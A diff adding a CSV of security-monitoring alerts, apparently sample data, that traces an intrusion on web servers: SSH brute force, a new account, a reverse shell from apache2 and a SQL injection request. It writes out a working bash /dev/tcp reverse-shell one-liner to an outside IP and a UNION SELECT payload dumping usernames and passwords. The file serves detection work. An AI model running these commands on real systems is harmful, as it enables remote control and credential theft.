@@ -1,0 +1,7 @@
+timestamp,rule.level,rule.id,rule.description,rule.groups,agent.name,agent.ip,data.srcip,full_log
+2026-11-04T08:12:03.512+0000,10,5712,sshd: brute force trying to get access to the system. Non existent user.,"syslog, sshd, authentication_failures",web-01,10.0.1.10,203.0.113.45,Nov  4 08:12:03 web-01 sshd[2211]: Invalid user admin from 203.0.113.45 port 51122
+2026-11-04T08:14:40.002+0000,12,40112,Multiple authentication failures followed by a success.,"syslog, sshd, authentication_success",web-01,10.0.1.10,203.0.113.45,Nov  4 08:14:40 web-01 sshd[2290]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2
+2026-11-04T08:20:11.900+0000,8,5902,New user added to the system.,"syslog, adduser",web-01,10.0.1.10,,"Nov  4 08:20:11 web-01 useradd[2301]: new user: name=svc_backup, UID=1002, GID=1002, home=/home/svc_backup"
+2026-11-04T08:25:52.114+0000,13,100210,Reverse shell spawned from web server process,"local, syscheck, attack",web-01,10.0.1.10,198.51.100.23,apache2 -> /bin/sh -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1
+2026-11-04T09:01:07.333+0000,6,31103,SQL injection attempt.,"web, accesslog, attack, sql_injection",web-02,10.0.1.11,192.0.2.77,"192.0.2.77 - - [04/Nov/2026:09:01:07 +0000] ""GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1"" 200 512"
+2026-11-04T09:03:15.010+0000,7,5404,Three failed attempts to run sudo,"syslog, sudo",db-01,10.0.2.20,,Nov  4 09:03:15 db-01 sudo: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
